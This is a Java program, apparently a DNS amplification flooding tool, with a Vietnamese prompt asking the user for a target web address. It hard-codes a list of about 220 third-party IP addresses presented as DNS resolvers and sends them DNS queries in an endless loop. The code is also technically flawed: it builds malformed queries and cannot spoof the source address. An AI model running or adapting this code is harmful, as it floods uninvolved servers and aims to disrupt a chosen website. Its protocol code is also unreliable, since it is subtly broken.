import java.io.ByteArrayOutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.Scanner;

class DNSAmplificationExample {
  static String targetDomain;
  static String[] List_dns = {
    "172.105.68.205", "118.24.125.199", "52.54.49.231", "166.149.186.89", "52.67.55.36",
    "185.72.34.101", "116.108.45.113", "134.209.104.94", "162.218.64.144", "106.75.115.145",
    "5.249.141.201", "104.169.160.211", "46.14.234.129", "35.72.46.23", "88.209.85.101",
    "116.62.140.200", "47.93.213.138", "44.217.128.34", "179.53.27.183", "103.241.29.55",
    "86.107.199.218", "103.170.193.65", "172.217.21.36", "18.168.136.5", "152.0.200.75",
    "52.215.179.1", "173.160.128.145", "51.195.14.92", "222.121.75.22", "52.203.176.19",
    "160.121.120.65", "168.76.202.84", "64.202.184.136", "96.253.14.97", "38.181.153.51",
    "201.229.145.140", "184.178.56.124", "216.219.88.122", "3.96.81.34", "54.218.165.230",
    "72.196.89.162", "5.45.127.114", "158.140.230.235", "66.168.223.117", "209.145.60.57",
    "128.90.101.223", "52.194.40.102", "174.141.179.156", "47.107.52.224", "116.203.233.172",
    "45.200.248.78", "83.169.4.49", "212.104.31.25", "38.207.218.52", "82.78.18.227",
    "185.243.76.218", "69.90.162.213", "35.167.144.76", "37.120.169.17", "54.203.89.185",
    "189.113.0.58", "64.58.253.62", "168.235.82.144", "137.74.198.114", "47.76.75.46",
    "83.252.109.1", "189.112.169.70", "185.203.39.57", "38.6.72.118", "38.173.98.239",
    "205.196.220.48", "45.92.17.252", "64.32.77.204", "122.17.138.192", "116.39.83.98",
    "3.131.51.223", "116.202.52.108", "20.31.214.212", "80.96.44.153", "102.216.80.101",
    "193.97.129.99", "51.81.233.241", "1.34.221.172", "46.10.204.24", "222.194.57.212",
    "185.237.158.37", "219.117.221.85", "147.30.32.130", "4.227.73.105", "85.116.134.50",
    "89.38.248.159", "185.162.225.34", "82.127.88.42", "146.103.38.158", "45.204.62.23",
    "129.213.56.81", "207.192.162.127", "38.173.66.248", "52.76.172.240", "190.119.109.112",
    "54.156.254.10", "154.22.220.30", "160.121.9.142", "139.9.37.244", "50.3.241.98",
    "218.75.216.24", "46.163.34.53", "58.194.183.184", "152.171.37.235", "3.22.3.234",
    "89.116.191.3", "46.107.183.2", "195.35.7.161", "185.104.100.72", "1.34.185.81",
    "141.136.36.42", "129.187.38.31", "149.28.140.194", "92.207.251.26", "13.237.183.250",
    "153.127.142.184", "164.163.9.136", "5.182.23.169", "87.98.234.85", "103.153.214.237",
    "35.141.144.77", "175.214.79.104", "167.57.199.183", "18.214.185.11", "52.22.58.185",
    "187.251.254.139", "156.223.125.134", "177.52.26.238", "62.221.228.101", "85.128.160.235",
    "44.217.13.103", "82.223.108.195", "18.193.12.58", "201.49.40.251", "38.253.137.244",
    "39.105.198.213", "119.226.85.225", "52.202.131.252", "188.64.81.231", "109.110.179.225",
    "75.31.20.109", "52.202.90.46", "95.217.47.36", "47.242.147.17", "109.168.101.64",
    "172.114.17.23", "120.46.172.121", "152.136.174.249", "134.209.0.9", "13.245.61.205",
    "34.247.58.153", "118.37.131.186", "184.167.124.233", "216.17.89.151", "130.185.81.163",
    "18.133.112.254", "178.207.13.89", "80.211.208.203", "104.207.250.162", "176.96.138.63",
    "52.215.58.77", "199.250.195.226", "175.41.129.127", "79.96.194.74", "130.37.53.114",
    "110.174.255.81", "116.203.255.166", "123.57.212.190", "212.27.10.203", "18.232.214.215",
    "82.165.36.132", "79.115.254.88", "179.42.135.236", "44.213.46.154", "65.109.205.16",
    "35.85.141.169", "71.9.164.248", "107.149.160.242", "110.14.234.189", "77.23.190.171",
    "20.160.90.112", "39.34.226.74", "139.9.72.142", "181.124.91.64", "212.126.59.187",
    "169.59.220.235", "103.72.78.170", "144.202.36.44", "154.209.124.46", "176.95.201.54",
    "176.31.229.98", "52.36.146.198", "116.12.55.42", "47.120.13.93", "88.210.9.38",
    "51.75.65.35", "59.110.127.247", "212.85.123.48", "44.195.151.250", "175.178.16.114",
    "35.194.253.64", "178.79.142.136", "195.137.149.192", "123.16.121.42", "188.26.96.242",
    "182.191.89.74", "101.200.218.184", "112.161.151.64", "61.216.129.85", "192.185.231.135",
    "212.193.148.36", "39.127.148.206","158.255.107.3","160.179.198.85"};
    
  public static void main(String[] args) {
   
      Scanner scanner = new Scanner(System.in);

    System.out.print("Nhập Link web : ");
     
      targetDomain = scanner.nextLine();
   
   

      while (true){
       try {
        for(String DNS_IP : List_dns){
         DatagramSocket socket = new DatagramSocket();
            InetAddress dnsServerAddress = InetAddress.getByName(DNS_IP);
            int port = 53; 
            
            byte[] dnsRequest = createDNSRequest();
            
            DatagramPacket packet = new DatagramPacket(dnsRequest, dnsRequest.length, dnsServerAddress, port);
            
            socket.send(packet);
            
             System.out.println("DNS " + DNS_IP + " ĐẾN " + targetDomain);
             
            socket.close();
            
        }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
       }
    }
    
    private static byte[] createDNSRequest() {
     String domain = targetDomain;
        try {
            String[] domainParts = domain.split("\\.");
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            
            for (String part : domainParts) {
                byte[] partBytes = part.getBytes("UTF-8");
                baos.write((byte) partBytes.length);
                baos.write(partBytes);
            }
            
            baos.write(0); 
            byte[] dnsRequest = baos.toByteArray();
            byte[] header = new byte[]{
                (byte) 0x00, (byte) 0x01,
                (byte) 0x01, (byte) 0x00,
                (byte) 0x00, (byte) 0x01,
                (byte) 0x00, (byte) 0x00,
                (byte) 0x00, (byte) 0x00,
                (byte) 0x00, (byte) 0x00
            };
            ByteArrayOutputStream requestStream = new ByteArrayOutputStream();
            requestStream.write(header);
            requestStream.write(dnsRequest);
            
            return requestStream.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}
